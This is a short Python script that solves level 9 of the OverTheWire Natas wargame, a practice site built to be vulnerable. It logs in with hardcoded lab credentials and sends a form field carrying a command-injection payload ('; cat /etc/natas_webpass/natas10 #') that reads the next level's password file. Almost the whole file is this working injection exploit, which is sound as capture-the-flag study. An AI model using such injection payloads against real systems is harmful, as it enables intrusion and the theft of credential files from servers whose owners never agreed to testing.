import requests as req
import re



username="natas9"
password='ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t'

url="http://%s.natas.labs.overthewire.org/" % username

data={
    "needle":"a >/dev/null; cat /etc/natas_webpass/natas10 #",
    "submit":"submit"
}

s=req.Session()
response=s.post(url,auth=(username,password),data=data)

print(re.findall("<pre>\n(.*)\n</pre>",response.text)[0])


